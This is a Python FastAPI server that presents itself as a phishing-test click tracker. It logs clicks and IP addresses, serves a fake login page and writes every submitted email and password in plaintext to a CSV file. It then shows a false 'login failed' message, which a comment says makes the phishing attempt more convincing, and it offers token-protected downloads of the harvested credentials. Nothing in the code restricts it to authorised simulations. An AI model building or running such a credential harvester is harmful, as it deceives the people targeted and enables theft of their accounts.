from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, FileResponse
from fastapi.templating import Jinja2Templates
from datetime import datetime
import csv
import os
from config import *

app = FastAPI()

templates = Jinja2Templates(directory="templates")
LOG_FILE = 'logs/clicks.csv'
CREDENTIALS_LOG_FILE = 'logs/credentials.csv'
REDIRECT_AFTER = '/fake-login'

@app.get("/", response_class=HTMLResponse)
async def index():
    return """
    <h1>Phishing Test Click Tracker is Running (FastAPI)</h1>
    <p>This server is working correctly.</p>
    <p>To test the click tracking functionality, you should visit a URL like this:</p>
    <a href="/click?user=test_user">/click?user=test_user</a>
    """

@app.get("/click")
async def click(request: Request, user: str = 'unknown'):
    timestamp = datetime.utcnow().isoformat()
    ip = request.client.host

    os.makedirs('logs', exist_ok=True)
    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([user, timestamp, ip])

    return RedirectResponse(url=REDIRECT_AFTER)

@app.get("/fake-login", response_class=HTMLResponse)
async def fake_login(request: Request):
    return templates.TemplateResponse("fake_login.html", {"request": request})

@app.post("/login")
async def login(request: Request, email: str = Form(...), password: str = Form(...)):
    timestamp = datetime.utcnow().isoformat()
    ip = request.client.host

    os.makedirs('logs', exist_ok=True)
    with open(CREDENTIALS_LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([email, password, timestamp, ip])
    
    # Redirect to a generic error page to make the phishing attempt more convincing
    return RedirectResponse(url="/login-failed")

@app.get("/login-failed", response_class=HTMLResponse)
async def login_failed():
    return """
    <h1>Login Failed</h1>
    <p>The email or password you entered is incorrect.</p>
    <p>Please try again or contact support.</p>
    """

@app.get("/download/clicks")
async def download_clicks(token: str = ""):
    if token != LOG_DOWNLOAD_TOKEN:
        raise HTTPException(status_code=403, detail="Forbidden")
    file_path = 'logs/clicks.csv'
    if not os.path.exists(file_path):
        return HTMLResponse("<h2>No clicks have been logged yet.</h2>", status_code=404)
    return FileResponse(file_path, media_type='text/csv', filename='clicks.csv')

@app.get("/download/credentials")
async def download_credentials(token: str = ""):
    if token != LOG_DOWNLOAD_TOKEN:
        raise HTTPException(status_code=403, detail="Forbidden")
    file_path = 'logs/credentials.csv'
    if not os.path.exists(file_path):
        return HTMLResponse("<h2>No credentials have been logged yet.</h2>", status_code=404)
    return FileResponse(file_path, media_type='text/csv', filename='credentials.csv')

if __name__ == '__main__':
    print("===================================================")
    print("🚀 Starting BASIC Click Tracker for testing...")
    print("➡️  Server is running at http://localhost:8000")
    print("===================================================")
    app.run(host='0.0.0.0', port=10000, debug=True)

    """
    uvicorn main:app --host 0.0.0.0 --port 10000
    """